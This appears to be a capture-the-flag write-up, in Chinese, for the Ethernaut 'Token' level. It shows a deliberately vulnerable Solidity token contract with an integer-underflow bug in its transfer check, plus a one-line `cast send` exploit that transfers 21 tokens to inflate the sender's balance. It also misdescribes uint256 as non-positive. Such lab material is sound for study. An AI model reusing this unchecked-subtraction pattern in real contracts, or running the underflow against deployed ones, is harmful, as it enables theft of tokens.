#   Level 5 Token
實例地址：`0x890b079EF068570fD19d74DcbFB4D378Bf7dad2C`

##  題目說明
這一關的目標是駭入下面這個簡單的代幣合約。

你一開始會被給 20 個代幣。如果你找到方法增加你手中代幣的數量，你就可以通過這一關，當然代幣數量越多越好。

可能會有用的資訊

*   什麽是 odometer?

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

##  POC
這合約的漏洞是溢位問題，uint256 為非正整數，當他被減為負數時候，變數內容呈現正數而不是負數。隨機轉給別人超過 20 塊，造成溢位導致自身餘額超過 20。

```bash
cast send --account=Panda  0x890b079EF068570fD19d74DcbFB4D378Bf7dad2C "transfer(address,uint256)(bool)" 0x23091d5f37FBeAd4C5109A0cDb2A00989ADA0836 21
```


